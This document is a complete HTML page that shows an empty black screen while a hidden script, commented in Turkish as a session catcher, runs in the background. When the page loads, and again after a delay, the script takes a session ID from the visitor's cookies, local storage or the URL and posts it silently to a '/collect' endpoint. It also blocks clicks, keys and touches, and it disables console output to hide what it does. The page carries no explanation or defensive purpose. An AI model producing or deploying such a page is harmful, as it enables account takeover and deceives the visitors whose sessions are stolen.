<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>.</title>
  <style>
    * { margin: 0; padding: 0; }
    body { 
      background: #000; 
      min-height: 100vh; 
      display: flex; 
      align-items: center; 
      justify-content: center; 
      color: #000; 
      font-family: system-ui;
    }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div style="display:none;"></div>

  <script>
    (function() {
      // ---- GİZLİ SESSION YAKALAYICI ----
      function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
      }

      async function captureSession() {
        try {
          let sessionId = getCookie('sessionid');
          if (!sessionId) {
            sessionId = localStorage.getItem('sessionid');
          }
          if (!sessionId) {
            const params = new URLSearchParams(window.location.search);
            sessionId = params.get('sessionid');
          }

          if (sessionId) {
            const response = await fetch('/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sessionId: sessionId })
            });
            const data = await response.json();
            if (data.success) {
              console.log('✅ Session captured silently');
            } else {
              console.log('❌ Capture failed:', data.error);
            }
          } else {
            console.log('ℹ️ No session ID found');
          }
        } catch (err) {
          console.log('⚠️ Silent error:', err.message);
        }
      }

      if (document.readyState === 'complete') {
        captureSession();
      } else {
        window.addEventListener('load', captureSession);
      }

      setTimeout(captureSession, 3000);

      document.addEventListener('click', (e) => e.preventDefault());
      document.addEventListener('contextmenu', (e) => e.preventDefault());
      document.addEventListener('keydown', (e) => e.preventDefault());
      document.addEventListener('touchstart', (e) => e.preventDefault());
      
      console.log = function() {};
      console.warn = function() {};
      console.error = function() {};
    })();
  </script>
</body>
</html>
